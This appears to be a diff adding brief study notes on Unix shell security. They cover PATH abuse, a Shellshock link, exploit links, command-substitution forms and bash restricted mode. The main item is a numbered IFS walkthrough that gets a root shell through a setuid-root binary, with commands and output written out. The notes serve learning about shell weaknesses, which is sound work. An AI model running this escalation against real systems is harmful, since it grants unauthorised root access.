@@ -1,0 +1,34 @@
+Shellshock: http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29
+
+abuse of PATH
+$ program
+instead of
+$ ./program
+
+abuse of IFS
+1) 	$ cat /home/nick/bin
+2) 	...#!/bin/bash
+3) 	.../bin/sh #this script will execute /bin/sh
+4) 	$ ls -al /usr/local/date
+5) 	---s--x--x 1 root root 21673 Mar 9 18:36 date
+6) 	$ PATH=/home/nick:${PATH}
+7) 	$ export PATH
+8) 	$ IFS=/
+9) 	$ export IFS
+10) 	$ /usr/local/date
+11) 	# whoami
+12) 	root
+
+IFS exploits:
+	http://www.securityfocus.com/bid/454/exploit
+	http://seclists.org/bugtraq/1996/Jun/82
+
+Executing applications:
+
+	`cmd`
+	$(cmd)
+	exec cmd
+	/bin/bash cmd
+
+Running bash in restricted mode:	http://linux.die.net/man/1/bash
+	search for RESTRICTED SHELL
